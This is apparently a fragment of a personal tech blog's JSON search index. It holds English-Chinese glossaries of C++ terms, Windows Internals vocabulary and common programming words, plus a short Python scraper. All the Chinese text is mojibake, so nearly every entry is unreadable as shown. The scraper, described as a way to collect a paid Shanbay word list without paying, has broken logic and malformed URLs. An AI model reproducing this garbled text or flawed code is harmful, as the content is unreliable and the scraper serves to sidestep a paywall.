ä½œç”¨åŸŸ search æŸ¥æ‰¾ semantics è¯­ä¹‰ setter è®¾å€¼å‡½æ•° signature ç­¾å smart pointer æ™ºèƒ½æŒ‡é’ˆ specialization ç‰¹åŒ– source æºç  stack æ ˆ standard library æ ‡å‡†ç¨‹åºåº“ statement è¯­å¥ static é™æ€çš„ string å­—ç¬¦ä¸² subtype å­ç±»å‹ support æ”¯æŒ template æ¨¡æ¿ temporary object ä¸´æ—¶å¯¹è±¡ text æ–‡æœ¬ thread çº¿ç¨‹ thread safe å¤šçº¿ç¨‹å®‰å…¨ throw æŠ›å‡º token è¯­æ±‡å•å…ƒ type ç±»å‹ unary function å•å‚å‡½æ•° underflow ä¸‹æº¢ unqualified æœªç»èµ„æ ¼ä¿®é¥° user ç”¨æˆ· user interface ç”¨æˆ·ç•Œé¢ value å€¼ variable å˜é‡ vector çŸ¢é‡ virtual function è™šæ‹Ÿå‡½æ•° virtual machine è™šæ‹Ÿæœº","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"é€ŸæŸ¥","slug":"é€ŸæŸ¥","permalink":"https://hodlyounger.github.io/tags/%E9%80%9F%E6%9F%A5/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"En","slug":"E-æ‰‹å†Œ/En","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/En/"}]},{"title":"ã€Englishã€‘ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹ä¸€ä¹¦é™„å½•ä¸­è‹±è¯­å•è¯æ•´ç†","date":"2023-10-27T01:24:02.469Z","path":"E_æ‰‹å†Œ/En/ã€Englishã€‘CodeEn_from_Windows/","text":"æ‘˜è‡ªã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹é™„å½•ç« èŠ‚çš„è‹±è¯­å¯¹ç…§ã€‚ ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹æœ¯è¯­å¯¹ç…§è¡¨ è‹±æ–‡ å¯¹ç…§ access token è®¿é—®ä»¤ç‰Œ access validation è®¿é—®éªŒè¯ access-control entryï¼ŒACE è®¿é—®æ§åˆ¶é¡¹ access-control listï¼ŒACL è®¿é—´æ§åˆ¶åˆ—è¡¨ Active Directory æ´»åŠ¨ç›®å½• Address Windowing Extensionï¼ŒAWE åœ°å€çª—å£ context switch ç¯å¢ƒåˆ‡æ¢æ‰©å±• affinity äº²å’Œæ€§ alert è­¦é†’ assertion æ–­è¨€ asymmetric multiprocessingï¼ŒASMP éå¯¹ç§°å¤šå¤„ç† asynchronous procedure callï¼ŒAPC å¼‚æ­¥è¿‡ç¨‹è°ƒç”¨ attach é™„è½½ authentication è®¤è¯ balance set manager å¹³è¡¡é›†ç®¡ç†å™¨ bin å·¢ç®± bindï¼Œ binding ç»‘å®š blue screen è“å± boost æå‡ boot å¼•å¯¼ boot partition å¼•å¯¼åˆ†åŒº boot sector å¼•å¯¼æ‰‡åŒº boot volume å¼•å¯¼å· bucket æ¡¶ bug check é”™è¯¯æ£€æŸ¥ bus driver æ€»çº¿å‹é©±åŠ¨ç¨‹åº cable çº¿ç¼† cache manager ç¼“å­˜ç®¡ç†å™¨ cache miss ç¼“å­˜æœªå‘½ä¸­ Careful Write file system è°¨æ…å†™æ–‡ä»¶ç³»ç»Ÿ catalog file ç¼–ç›®æ–‡ä»¶ cel å·¢å®¤ change journal å˜åŒ–æ—¥å¿— class driver ç±»é©±åŠ¨ç¨‹åº cluster ç°‡ï¼ˆç”¨äºç£ç›˜å­˜å‚¨å•å…ƒï¼‰ï¼Œé›†ç¾¤ COM ç»„ä»¶å¯¹è±¡æ¨¡å‹ committed memory æäº¤çš„å†…å­˜ Common Internet File Systemï¼Œ CIFS Internet æ–‡ä»¶ç³»ç»Ÿ compatibility å…¼å®¹æ€§ concurrency å¹¶å‘æ€§ context ç¯å¢ƒ copy-on-write å†™æ—¶å¤åˆ¶ crash analysis å´©æºƒåˆ†æ crash dump å´©æºƒè½¬å‚¨ credential å‡­è¯ critical section ä¸´ç•ŒåŒº cryptographic service providerï¼ŒCSP å¯†ç æœåŠ¡æä¾›è€… cyclic redundancy checksumï¼Œ CRC å¾ªç¯å†—ä½™æ£€éªŒå’Œ DCOM åˆ†å¸ƒå¼ç»„ä»¶å¯¹è±¡æ¨¡å‹ deadlock æ­»é” debugger è°ƒè¯•å™¨ deferred procedure callï¼ŒDPC å»¶è¿Ÿè¿‡ç¨‹è°ƒç”¨ defragmenter ç¢ç‰‡æ•´ç†å™¨ deliver äº¤ä»˜ï¼ˆé’ˆå¯¹APC&amp;DPCï¼‰ dependency ç›¸ä¾æ€§ desktop æ¡Œé¢ device driver è®¾å¤‡é©±åŠ¨ç¨‹åº Device Enumeration è®¾å¤‡åˆ—ä¸¾ Discretionary access controlï¼ŒDAC è‡ªä¸»è®¿é—®æ§åˆ¶ disk spanning ç£ç›˜è·¨å±• dismount å¸è½½ dispatcher åˆ†å‘å™¨ dispatching åˆ†å‘ Distributed File Systemï¼ŒDFS åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ docking station æ’æ¥ç«™ double-freeing ä¸¤æ¬¡é‡Šæ”¾ drive letter é©±åŠ¨å™¨å­—æ¯ Driver Verifier é©±åŠ¨ç¨‹åºæ£€éªŒå™¨ dynamic link libraryï¼ŒDLL åŠ¨æ€é“¾æ¥åº“ Encrypting File Systemï¼Œ EFS åŠ å¯†æ–‡ä»¶ç³»ç»Ÿ environment subsystem ç¯å¢ƒå­ç³»ç»Ÿ ETWï¼Œ Event Tracing for Windows Windows äº‹ä»¶è·Ÿè¸ª event äº‹ä»¶ Event Log äº‹ä»¶æ—¥å¿— exception å¼‚å¸¸ exception dispatching å¼‚å¸¸åˆ†å‘ exception frame å¼‚å¸¸å¸§ exception handler å¼‚å¸¸å¤„ç†å™¨ exception handling å¼‚å¸¸å¤„ç† executive æ‰§è¡Œä½“ executive object æ‰§è¡Œä½“å¯¹è±¡ extended partition æ‰©å±•åˆ†åŒº extensibility æ‰©å±•æ€§ Extensible Firmware Interfaceï¼ŒEFI å¯æ‰©å±•çš„å›ºä»¶æ¥å£ fast mutex å¿«é€Ÿäº’æ–¥ä½“ fault tolerance å®¹é”™ fiber çº¤ç¨‹ fibre channel å…‰çº¤é€šé“ file allocation table æ–‡ä»¶åˆ†é…è¡¨ file encryption keyï¼ŒFEK æ–‡ä»¶åŠ å¯†å¯†é’¥ file mapping object æ–‡ä»¶æ˜ å°„å¯¹è±¡ file system driverï¼Œ FSD æ–‡ä»¶ç³»ç»Ÿé©±åŠ¨ç¨‹åº file system recognizer æ–‡ä»¶ç³»ç»Ÿè¯†åˆ«å™¨ filter driver è¿‡æ»¤å‹é©±åŠ¨ç¨‹åº firmware å›ºä»¶ footprint å°è¿¹ free list ç©ºé—²ï¼ˆé¡µé¢ï¼‰åˆ—è¡¨ function driver åŠŸèƒ½å‹é©±åŠ¨ç¨‹åº GINA å›¾å½¢åŒ–æ ‡è¯†å’Œè®¤è¯ Group Policy ç»„ç­–ç•¥ guard page å®ˆæŠ¤é¡µé¢ GUID å…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦ GUID Partition Tableï¼ŒGPT GUID åˆ†åŒºè¡¨ handle å¥æŸ„ handle table å¥æŸ„è¡¨ handler å¤„ç†å™¨ hardware abstraction layer ç¡¬ä»¶æŠ½è±¡å±‚ï¼ˆHALï¼‰ heap manager å †ç®¡ç†å™¨ hive å‚¨å·¢ hotfix çƒ­è¡¥ä¸ Hyper-Threading è¶…çº¿ç¨‹ I/O request packetï¼ŒIRP I/O è¯·æ±‚åŒ… idle process ç©ºé—²è¿›ç¨‹ idle thread ç©ºé—²çº¿ç¨‹ impersonation æ¨¡ä»¿ inter-processor interruptï¼ŒIPI å¤„ç†å™¨é—´çš„ä¸­æ–­ interrupt controller ä¸­æ–­æ§åˆ¶å™¨ interrupt dispatch table ä¸­æ–­åˆ†å‘è¡¨ interrupt handler ä¸­æ–­å¤„ç†å™¨ interrupt request levelï¼ŒIRQL ä¸­æ–­è¯·æ±‚çº§åˆ« Interrupt service routineï¼ŒISR ä¸­æ–­æœåŠ¡ä¾‹ç¨‹ interupt ä¸­æ–­ job ä½œä¸š junction äº¤æ¥ kernel å†…æ ¸ kernel mode å†…æ ¸æ¨¡å¼ kernel object å†…æ ¸å¯¹è±¡ key ring å¯†é’¥ç¯ keystroke é”®å‡» last known goodï¼ŒLKG æœ€åå·²çŸ¥çš„å¥½é…ç½®ï¼Œæœ€åå·²çŸ¥çš„å¥½æ§åˆ¶é›† lazy write file system å»¶è¿Ÿå†™æ–‡ä»¶ç³»ç»Ÿ lazy writer å»¶è¿Ÿå†™å‡ºå™¨ Lightweight Directory Acess Protocol, LDAP è½»é‡çš„ç›®å½•è®¿é—®åè®® local procedure callï¼ŒLPC æœ¬åœ°è¿‡ç¨‹è°ƒç”¨ local security authentication æœ¬åœ°å®‰å…¨è®¤è¯ lock convoy é”å°æŠ¤ loCompletion I/O å®Œæˆ logical cluster number.LCN é€»è¾‘ç°‡å· Logical Disk Manager.LDM é€»è¾‘ç£ç›˜ç®¡ç†å™¨ logical prefetcher é€»è¾‘é¢„å–å™¨ logical sequence numberï¼ŒLSN é€»è¾‘åºåˆ—å· logon ç™»å½• look-aside list é¢„è¯»åˆ—è¡¨ Low Fragmentation Heapï¼ŒLFH ä½ç¢ç‰‡å † LUID æœ¬åœ°å”¯ä¸€æ ‡è¯†ç¬¦ mailslot é‚®ä»¶æ§½ managed code æ‰˜ç®¡ä»£ç  manifest æ¸…å• mapped file æ˜ å°„çš„æ–‡ä»¶ master boot record.MBR ä¸»å¼•å¯¼è®°å½• master file table ä¸»æ–‡ä»¶è¡¨ mechanism æœºåˆ¶ memory å†…å­˜ memory descriptor list.MDL å†…å­˜æè¿°ç¬¦åˆ—è¡¨ memory mapped file å†…å­˜æ˜ å°„æ–‡ä»¶ metadata å…ƒæ•°æ® microkernel å¾®å†…æ ¸ minidump å°è½¬å‚¨ miniport å°ç«¯å£ miniport driver å°ç«¯å£é©±åŠ¨ç¨‹åº mirrored volume é•œåƒå· MMC snap-in MMC åŠ è½½ä»¶ modified page writer å·²ä¿®æ”¹é¡µé¢å†™å‡ºå™¨ mount æŒ‚è½½ mount point æŒ‚è½½ç‚¹ multimaster replication å¤šä¸»å¤åˆ¶ Multiple Provider Router å¤šæä¾›è€…è½¬å‘å™¨ Multiple UNC Providerï¼ŒMUP å¤šUNCæä¾›è€… multiprocessing å¤šå¤„ç† multitasking å¤šä»»åŠ¡ mutant çªå˜ä½“ mutex äº’æ–¥ä½“ named pipe å‘½åç®¡é“ native åŸç”Ÿçš„ network address translation.NAT ç½‘ç»œåœ°å€è½¬è¯‘ Network Driver Interface Specification, NDIS ç½‘ç»œé©±åŠ¨ç¨‹åºæ¥å£è§„èŒƒ Network Monitor ç½‘ç»œç›‘è§†å™¨ network share ç½‘ç»œå…±äº«ä½“ NTFS object atribute NTFS å¯¹è±¡å±æ€§ NUMAï¼ˆnon-uniform memory architectureï¼‰ éä¸€è‡´çš„å†…å­˜ç»“æ„ objcct manager å¯¹è±¡ç®¡ç†å™¨ object linking and embedding. OLE å¯¹è±¡é“¾æ¥å’ŒåµŒå…¥ ommit æäº¤ on-disk structure ç£ç›˜ä¸Šçš„ç»“æ„ Open System Interconnectionï¼Œ OSI å¼€æ”¾ç³»ç»Ÿäº’è” opportunistic lockingï¼Œoplock æœºä¼šé” overlapped å¯é‡å çš„ page é¡µé¢ page directory é¡µç›®å½• page directory entryï¼ŒPDE é¡µç›®å½•é¡¹ page fault é¡µé¢é”™è¯¯ page fileï¼Œpaging file é¡µé¢æ–‡ä»¶ page frame numberï¼ŒPFN é¡µé¢å¸§ç¼–å· page table é¡µè¡¨ page table entryï¼ŒPTE é¡µè¡¨é¡¹ pageable æ¢é¡µçš„ paged poolï¼Œ nonpaged pool æ¢é¡µå†…å­˜æ± ï¼Œéæ¢é¡µå†…å­˜æ±  pager æ¢é¡µå™¨ parition åˆ†åŒº partition table åˆ†åŒºè¡¨ payload æœ‰æ•ˆè½½è· Performance Monitor æ€§èƒ½ç›‘è§†å™¨ Performance tool æ€§èƒ½å·¥å…· Physical Address Extensionï¼ŒPAE ç‰©ç†åœ°å€æ‰©å±• placement policy æ”¾ç½®ç­–ç•¥ plug and play å³æ’å³ç”¨ pool tracking å†…å­˜æ± è·Ÿè¸ª port driver ç«¯å£é©±åŠ¨ç¨‹åº portability å¯ç§»æ¤æ€§ preempt æŠ¢å  preemptive æŠ¢å…ˆå¼ prefetcher é¢„å–å™¨ principal å®‰å…¨ä¸ªä½“ priority boost ä¼˜å…ˆçº§æå‡ priority inversion ä¼˜å…ˆçº§å€’ç½® privilege ç‰¹æƒ procedure è¿‡ç¨‹ process è¿›ç¨‹ Process environment blockï¼ŒPEB è¿›ç¨‹ç¯å¢ƒå— process explorer è¿›ç¨‹ç®¡ç†å™¨ï¼ˆè§†ä¸Šä¸‹æ–‡ process manager è¿›ç¨‹ç®¡ç†å™¨ï¼ˆè§†ä¸Šä¸‹æ–‡ processor å¤„ç†å™¨ profile è½®å»“ï¼Œæ€§èƒ½å‰–æ prototype page table entryï¼Œprototype PTE åŸå‹é¡µè¡¨é¡¹ push lock æ¨é” quality of serviceï¼ŒQOS æœåŠ¡è´¨é‡ quantum æ—¶é™ quantum boosting æ—¶é™å¢å¤§ queue é˜Ÿåˆ— quota é…é¢ quota charges é…é¢èŠ±è´¹ RAM Optimizer RAM ä¼˜åŒ–å™¨ read-ahead é¢„è¯» record è®°å½• recoverability å¯æ¢å¤æ€§ Recovery Console æ¢å¤æ§åˆ¶å° redirector é‡å®šå‘å™¨ redo é‡åš reference count å¼•ç”¨è®¡æ•° reference monitor å¼•ç”¨ç›‘è§†å™¨ registry æ³¨å†Œè¡¨ registry key æ³¨å†Œè¡¨é”® registry value æ³¨å†Œè¡¨å€¼ reliability å¯é æ€§ Remote Direct Memory Accessï¼Œ RDMA è¿œç¨‹ç›´æ¥å†…å­˜è®¿é—® Remote NDIS å¤–æ¥NDIS remote procedure callï¼ŒRPC è¿œè¿‡ç¨‹è°ƒç”¨ reparse é‡è§£æ reparse point é‡è§£æç‚¹ reserved memory ä¿ç•™çš„å†…å­˜ resource accounting èµ„æºè®°è´¦ resource gate èµ„æºé—¨æ§ Resource Reservation Protocolï¼ŒRSVP èµ„æºé¢„ç•™åè®® robustness å¥å£®æ€§ routine ä¾‹ç¨‹ run è¡Œä¸²ï¼ˆç”¨äºNTFSç»“æ„ä¸­ï¼‰ scalability å¯ä¼¸ç¼©æ€§ scatter/gather LI/O åˆ†æ•£/èšé›† I/O scheduler è°ƒåº¦å™¨ schema è¡¨ç»“æ„ secondary object namespace ä»å±å¯¹è±¡åå­—ç©ºé—´ section object å†…å­˜åŒºå¯¹è±¡ sectionï¼Œ memory section å†…å­˜åŒº sector sparing æ‰‡åŒºå¤‡ç”¨ secure attention sequence.SAS å®‰å…¨æ³¨æ„åºåˆ— Security Accounts Managerï¼Œ SAM å®‰å…¨è´¦æˆ·ç®¡ security credential å®‰å…¨å‡­è¯ Security descriptor å®‰å…¨æè¿°ç¬¦ security identifierï¼Œ SID å®‰å…¨æ ‡è¯†ç¬¦ security quality of serviceï¼Œ SQOS å®‰å…¨æœåŠ¡è´¨é‡ Security reference monitor å®‰å…¨å¼•ç”¨ç›‘è§†å™¨ Security Support Provider Interfaceï¼ŒSSPI å®‰å…¨æ”¯æŒæä¾›è€…æ¥å£ security validation å®‰å…¨éªŒè¯ Semaphore ä¿¡å·é‡ serial port ä¸²è¡Œå£ server æœåŠ¡å™¨ service æœåŠ¡ Service Control Managerï¼ŒSCM æœåŠ¡æ§åˆ¶ç®¡ç†å™¨ service descriptor table æœåŠ¡æè¿°ç¬¦è¡¨ Service Pack æœåŠ¡è¡¥ä¸åŒ… session manager ä¼šè¯ç®¡ç†å™¨ session namespace ä¼šè¯åå­—ç©ºé—´ shared memory å…±äº«çš„å†…å­˜ shim é“ºå« shutdown åœæœº socket å¥—æ¥å­— sof fault è½¯é”™è¯¯ Software Restriction Policy è½¯ä»¶é™åˆ¶ç­–ç•¥ spanned volume è·¨è·å· spin-down åœæ­¢æ—‹è½¬ spinlock è‡ªæ—‹é” splash screen å¯åŠ¨å±å¹• stack frame æ ˆå¸§ stack location æ ˆå•å…ƒ stack overrun æ ˆæº¢å‡º stack trash æ ˆç ´å standby list å¤‡ç”¨ï¼ˆé¡µé¢ï¼‰åˆ—è¡¨ startup å¯åŠ¨ starvation é¥¥é¥¿ storage area networkï¼ŒSAN å­˜å‚¨åŒºåŸŸç½‘ç»œ striped volume æ¡å¸¦å· stub å­˜æ ¹ symbolic link ç¬¦å·é“¾æ¥ symmetric multiprocessingï¼Œ SMP å¯¹ç§°å¤šå¤„ç† synchronization åŒæ­¥ system service ç³»ç»ŸæœåŠ¡ system service call ç³»ç»ŸæœåŠ¡è°ƒç”¨ç†å™¨ system service dispatching ç³»ç»ŸæœåŠ¡åˆ†å‘ system volume ç³»ç»Ÿå· targeted DPC å®šå‘çš„DPCï¼ˆä¸ç‰¹å®šçš„CPUç›¸å…³è”ï¼‰ Task Manager ä»»åŠ¡ç®¡ç†å™¨ task ofloading ä»»åŠ¡å¤–ç§» TDI transport TD 1ä¼ è¾“å™¨ terminal service ç»ˆç«¯æœåŠ¡ thread çº¿ç¨‹ Thread environment blockï¼ŒTEB çº¿ç¨‹ç¯å¢ƒå— thread scheduling çº¿ç¨‹è°ƒåº¦ thread-thrashing çº¿ç¨‹é¢‘ç¹è½®æ¢ tick å˜€å—’ time slice æ—¶é—´ç‰‡ timer å®šæ—¶å™¨ TLS çº¿ç¨‹å±€éƒ¨å­˜å‚¨åŒº transaction äº‹åŠ¡ transition è½¬ç§»ï¼Œè½¬æ¢ Translation Look-aside Bufferï¼ŒTLB åœ°å€è½¬è¯‘å¿«æŸ¥ç¼“å†²åŒº Transport Driver Interfaceï¼Œ TDI ä¼ è¾“é©±åŠ¨ç¨‹åºæ¥å£ trap æ•è·ï¼ˆåŠ¨è¯ï¼‰ï¼Œé™·é˜±ï¼ˆåè¯ï¼‰ trap frame é™·é˜±å¸§ trap handler é™·é˜±å¤„ç†å™¨ trigger è§¦å‘å™¨ trim ä¿®å‰ª truncate æˆªæ–­ã€æˆªçŸ­ undo æ’¤é”€ unicast å•æ’­ Universal Disk Formatï¼Œ UDF é€šç”¨ç£ç›˜æ ¼å¼ Universal Naming Conventionï¼Œ UNC ç»Ÿä¸€å‘½åè§„èŒƒ Universal Plug and Play.UPnP é€šç”¨å³æ’å³ç”¨ unmanaged code éæ‰˜ç®¡ä»£ç  user mode ç”¨æˆ·æ¨¡å¼ view è§†å›¾ï¼ˆç¡®åˆ‡å«ä¹‰è§†ä¸Šä¸‹æ–‡ï¼‰ virtual address control blockï¼ŒVACB è™šæ‹Ÿåœ°å€æ§åˆ¶å— Virtual address descriptorï¼ŒVAD è™šæ‹Ÿåœ°å€æè¿°ç¬¦ virtual cluster numberï¼ŒVCN è™šæ‹Ÿç°‡å· volatile æ˜“å¤±çš„ã€æ˜“å¤±æ€§ window station çª—å£ç«™ Windows ç®¡ç†è§„èŒƒ Windows Driver Modelï¼Œ WDM Windows é©±åŠ¨ç¨‹åºæ¨¡å‹ Windows Error Reporting Windows é”™è¯¯æŠ¥å‘Š Windows File Protectionï¼Œ WFP Windows æ–‡ä»¶ä¿æŠ¤æœºåˆ¶ Windows Global Flags Windows å…¨å±€æ ‡å¿— Windows Internet åç§°æœåŠ¡ Windows Internet Name Service WINSï¼ŒWindowsç®¡ç†è§„èŒƒ Windows Management Instrumentation Windowsç®¡ç†è§„èŒƒ Windows Sockets Directï¼Œ WSD Windows å¥—æ¥å­—ç›´æ¥è®¿é—® working set å·¥ä½œé›† working set trimming å·¥ä½œé›†ä¿®å‰ª write throtling å†™èŠ‚æµ write-behind æ»åå†™ write-through ç›´å†™ yield æ”¾å¼ƒ zero list é›¶ï¼ˆé¡µé¢ï¼‰åˆ—è¡¨ zero page thread é›¶é¡µé¢çº¿ç¨‹","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"ä¹¦ç±","slug":"ä¹¦ç±","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D/"},{"name":"ä¹¦ç±/ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","slug":"ä¹¦ç±-ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D-%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"},{"name":"è‹±è¯­","slug":"è‹±è¯­","permalink":"https://hodlyounger.github.io/tags/%E8%8B%B1%E8%AF%AD/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"En","slug":"E-æ‰‹å†Œ/En","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/En/"}]},{"title":"ã€Englishã€‘ç¼–ç¨‹å¸¸ç”¨è‹±è¯­è¯æ±‡","date":"2023-10-27T01:24:02.467Z","path":"E_æ‰‹å†Œ/En/ã€Englishã€‘CodeEn/","text":"ç¼–ç¨‹å¸¸ç”¨è‹±è¯­æ•´ç† ä¸€ã€äº¤äº’å¼ç¯å¢ƒä¸printè¾“å‡º 1ã€printï¼šæ‰“å°/è¾“å‡º 2ã€codingï¼šç¼–ç  3ã€syntaxï¼šè¯­æ³• 4ã€errorï¼šé”™è¯¯ 5ã€invalidï¼šæ— æ•ˆ 6ã€identifierï¼šåç§°/æ ‡è¯†ç¬¦ 7ã€character ï¼šå­—ç¬¦ äºŒã€å­—ç¬¦ä¸²çš„æ“ä½œ 1ã€userï¼šç”¨æˆ· 2ã€nameï¼šå§“å/åç§° 3ã€attributeï¼šå­—æ®µ/å±æ€§ 4ã€valueï¼šå€¼ ä¸‰ã€é‡å¤/è½¬æ¢/æ›¿æ¢/åŸå§‹å­—ç¬¦ä¸² 1ã€upperï¼šä¸Šé¢ 2ã€lowerï¼šä¸‹é¢ 3ã€capitalizeï¼šç”¨å¤§å†™å­—æ¯å†™æˆ–å°åˆ· 4ã€titleï¼šæ ‡é¢˜ 5ã€replaceï¼šæ›¿æ¢ 6ã€oldï¼šæ—§çš„ 7ã€newï¼šæ–°çš„ 8ã€countï¼šè®¡æ•° 9ã€swapï¼šäº’æ¢ 10ã€caseï¼šæƒ…å½¢ 11ã€pathï¼šè·¯å¾„ 12ã€newï¼šæ–°çš„\\æ–°å»º 13ã€projectï¼šé¡¹ç›® 14ã€testï¼šæµ‹è¯• 15ã€fileï¼šæ–‡ä»¶ 16ã€dataï¼šæ•°æ® å››ã€å»é™¤/æŸ¥è¯¢/è®¡æ•° 1ã€stripï¼šå»é™¤ 2ã€indexï¼šç´¢å¼• 3ã€findï¼šæŸ¥æ‰¾ 4ã€countï¼šè®¡æ•° 5ã€startï¼šå¼€å§‹ 6ã€endï¼šç»“æŸ 7ã€charsï¼šå­—ç¬¦ 8ã€subï¼šé™„å± äº”ã€è·å–è¾“å…¥/æ ¼å¼åŒ– 1ã€inputï¼šè¾“å…¥ 2ã€promptï¼šæç¤º 3ã€IDï¼šèº«ä»½è¯ 4ã€formatï¼šæ ¼å¼åŒ– 5ã€argsï¼ˆargumentï¼‰ï¼šå‚æ•° 6ã€kwargsï¼šå…³é”®å­—å‚æ•° 7ã€yearï¼šå¹´ 8ã€monthï¼šæœˆ 9ã€dayï¼šæ—¥ å…­ã€å…ƒç¥– 1ã€tupleï¼šå…ƒç»„ 2ã€maxï¼šæœ€å¤§ 3ã€minï¼šæœ€å° 4ã€iterableï¼šå¯è¿­ä»£ 5ã€keyï¼šå…³é”®å­— 6ã€functionï¼šæ–¹æ³•/å‡½æ•° 7ã€stopï¼šåœæ­¢ 8ã€objectï¼šå¯¹è±¡ ä¸ƒã€åˆ—è¡¨ 1ã€listï¼šåˆ—è¡¨ 2ã€reverseï¼šåå‘ 3ã€trueï¼šçœŸ 4ã€falseï¼šå‡ 5ã€appendï¼šé™„åŠ  6ã€extendï¼šæ‰©å±• 7ã€insertï¼šæ’å…¥ 8ã€popï¼šå–å‡º 9ã€removeï¼šç§»é™¤ 10ã€delï¼ˆdeleteï¼‰ï¼šåˆ é™¤ 11ã€clearï¼šæ¸…é™¤ 12ã€sortï¼šæ’åº å…«ã€é›†åˆ 1ã€setï¼šé›†åˆ/è®¾ç½® 2ã€addï¼šæ·»åŠ  3ã€updateï¼šæ›´æ–° 4ã€discardï¼šä¸¢å¼ƒ 5ã€intersectionï¼šç›¸äº¤ 6ã€unionï¼šè”åˆ 7ã€differenceï¼šå·®æ•° 8ã€symmetricï¼šå¯¹ç§° 9ã€inï¼šåœ¨â€¦é‡Œé¢ 10ã€notï¼šä¸/ä¸æ˜¯ 11ã€disjointï¼šä¸ç›¸äº¤ 12ã€subsetï¼šå­é›† 13ã€supersetï¼šçˆ¶é›†/è¶…é›† 14ã€copyï¼šå¤åˆ¶ ä¹ã€å­—å…¸ 1ã€dictï¼šå­—å…¸ 2ã€keyï¼šé”®/å…³é”®å­— 3ã€valueï¼šå€¼ 4ã€itemï¼šé¡¹ 5ã€mappingï¼šæ˜ å°„ 6ã€seqï¼ˆsequenceï¼‰ï¼šåºåˆ— 7ã€fromï¼šä»/æ¥è‡ª 8ã€getï¼šè·å– 9ã€defaultï¼šé»˜è®¤ 10ã€noneï¼šæ²¡æœ‰ 11ã€argï¼šå¯å˜å…ƒç´  12ã€kwargsï¼ˆkeyword argsï¼‰ï¼šå¯å˜å…³é”®å­—å…ƒç´  åã€å¸¸ç”¨çš„ä¸€äº›å¿…å¤‡çš„è‹±è¯­å•è¯ Projects ï¼šé¡¹ç›® Process finished with exit code 0 è¿›ç¨‹ç»“æŸï¼Œé€€å‡ºä»£ç ä¸º0ï¼Œä¸€èˆ¬æ˜¯æ‰§è¡ŒæˆåŠŸçš„è¿‡ç¨‹ Processï¼š è¿‡ç¨‹ code ï¼šä»£ç  Tracebackï¼šå›æº¯ Fileï¼šæ–‡ä»¶ lineï¼šè¡Œ moduleï¼šæ¨¡å—['mÉ‘dÊ’ul] NameErrorï¼šåç§°é”™è¯¯ is not definedï¼šæ²¡æœ‰å®šä¹‰ SyntaxErrorï¼šè¯­æ³•é”™è¯¯ literalï¼šæ–‡å­—ï¼Œæ–‡å­—çš„ stringï¼šå­—ç¬¦ä¸² scanningï¼šæ‰«æ EOL ï¼šå¯¿å‘½ç»ˆæ­¢ IndentationErrorï¼šç¼©å‡é”™è¯¯ unindentï¼šå–æ¶ˆç¼©è¿› matchï¼šåŒ¹é… indentationï¼šç¼©è¿› [,ÉªndÉ›nâ€™teÊƒÉ™n]ç¼©è¿› unindent does not match any outer indentation levelï¼š æœªç¼©è¿›ä¸åŒ¹é…ä»»ä½•å¤–éƒ¨ç¼©è¿›çº§åˆ« invalid syntaxï¼šæ— æ•ˆçš„è¯­æ³• åä¸€ã€æ‰‡è´ æ‰‡è´ä¸Šæœ‰ä¸“é—¨æ•´ç†å¥½çš„pyhonå¸¸ç”¨å•è¯ï¼Œä½†æ˜¯è¦æ”¯ä»˜199è´å£³ã€‚ æˆ‘å†™äº†ä¸ªçˆ¬è™«ï¼Œå…199è´å£³å»æ”¯ä»˜â€¦æ‹¿ä¸‹ç½‘é¡µçš„å•è¯ï¼Œä¸‹é¢æ˜¯ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334import requestsimport refile = open(&quot;vocabulary.doc&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;)def spider(url): res = requests.get(url).text pattern = &#x27;&lt;strong&gt;([a-z,A-Z]*?)&lt;/strong&gt;\\s*&lt;/td&gt;\\s*&lt;td class=&quot;span10&quot;&gt;(.*?)&lt;/td&gt;&#x27; vocabulary_list = re.findall(pattern, res) for vocabulary in vocabulary_list: file.writelines((vocabulary[0].strip(&#x27;&#x27;), vocabulary[1].strip(&#x27;&#x27;), &quot;\\n&quot;))url_list = [&quot;[è¯ä¸²ï¼š list 1](https://www.shanbay.com/wordlist/104899/202159/?page=)&quot;, &quot;[è¯ä¸²ï¼š list 2](https://www.shanbay.com/wordlist/104899/202162/?page=)&quot;, ]for url in url_list: for i in range(1, 10): url = &quot;[è¯ä¸²ï¼š list 1](https://www.shanbay.com/wordlist/104899/202159/?page=)&quot; + str(i) spider(url)file.close() ä¼šç”Ÿæˆä¸€ä¸ªwordçš„ç»“æœæ–‡æ¡£åœ¨ä»£ç è¿è¡Œçš„åŒä¸€ç›®å½•ä¸‹ï¼Œç»“æœå¦‚ä¸‹ï¼Œæ²¡æœ‰å¯ä»¥æ’ç‰ˆï¼Œæœ€å¥½æ˜¯æ”¾åœ¨excelä¸‹ã€‚ åäºŒã€ç¨‹åºå‘˜å¸¸ç”¨å•è¯600ä¸ª A application åº”ç”¨ç¨‹å¼ åº”ç”¨ã€åº”ç”¨ç¨‹åº application framework åº”ç”¨ç¨‹å¼æ¡†æ¶ã€åº”ç”¨æ¡†æ¶ åº”ç”¨ç¨‹åºæ¡†æ¶ architecture 